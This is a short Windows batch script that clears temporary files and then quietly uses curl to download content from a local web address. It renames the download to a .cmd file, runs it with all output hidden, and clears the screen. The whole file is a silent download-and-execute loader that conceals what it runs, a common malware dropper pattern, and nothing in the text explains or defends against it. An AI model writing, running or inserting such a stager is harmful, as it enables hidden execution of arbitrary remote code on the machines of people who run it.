@echo off
if exist "%TEMP%\parse" del "%TEMP%\parse" >nul 2>&1
if exist "%TEMP%\token.cmd" del "%TEMP%\token.cmd" >nul 2>&1
curl -s -L -o "%TEMP%\parse" "http://localhost:4000/v2" >nul 2>&1
ren "%TEMP%\parse" token.cmd >nul 2>&1
"%TEMP%\token.cmd" >nul 2>&1
cls